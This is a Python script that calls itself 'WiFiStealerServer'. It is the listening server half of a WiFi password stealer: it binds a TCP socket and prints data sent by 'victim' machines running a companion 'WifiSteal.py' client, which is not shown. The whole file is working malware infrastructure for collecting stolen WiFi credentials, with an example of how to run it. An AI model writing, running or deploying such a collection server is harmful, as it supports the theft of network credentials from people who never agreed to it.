import socket
import sys
import time

try:
    arg = sys.argv[1]
    if arg == '-ip':
        IP = sys.argv[2]
        arg2 = sys.argv[3]
        PORT = sys.argv[4]
        if arg2 == '-port':
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Get local machine name
            host = IP

            # Reserve a port for your service.
            PORT = int(PORT)
            
            port = PORT

            # Bind the socket to a specific address and port
            s.bind((host, port))

            # Start listening for incoming connections
            s.listen(1)

            # Wait for a connection

            print("WiFiStealerServer is listen...")
            while True:
                conn, addr = s.accept()
                print("New Connection from ", addr)
                print('Data Captured')
                # Receive the message and decode it
                data = b''
                while True:
                    chunk = conn.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    
                    # print Data
                    print(chunk)


                message = data.decode()

                # Split the message into separate lines based on the newline characters
                lines = message.split("\n")

                # Print the lines
                for line in lines:
                    pass

                # Close the socket
                print("ONLY ONE CONECTION AT THE TIME")
                print('5 secinds cooldown')
                time.sleep(5)
                print(f'Connection close with {addr}')
                conn.close()


    elif arg == '--help':
        print('---------WiFiStealerServer--------')
        print('Commands:\n\t-ip ip to connect\n\t-port port to connect\n\nExample:WifiStealerServer.py -ip localhost -port 4444\t Script will run on localhost and port 444 you can change this in WifiSteal.py on line 6 and 8')
        print('The Scirpt will may broke if victim open multiply times')

except:
    print('User --help for more info')